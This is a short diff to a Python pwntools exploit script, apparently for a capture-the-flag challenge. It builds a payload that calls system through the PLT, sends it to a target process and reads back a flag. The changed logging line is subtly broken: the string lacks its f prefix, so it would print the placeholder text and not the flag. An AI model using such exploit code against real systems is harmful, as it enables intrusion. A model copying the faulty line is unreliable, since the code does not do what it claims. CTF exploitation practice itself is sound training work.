@@ -1,3 +1,5 @@
+#!/usr/bin/python3
+
 from pwn import *
 
 #context.log_level = 'DEBUG'
@@ -23,4 +25,4 @@ payload += p64(system_plt)
 
 p.sendline(payload)
 
-print "Flag:", p.recv(1024)
+log.info("Flag: {p.recv(1024).decode()}")
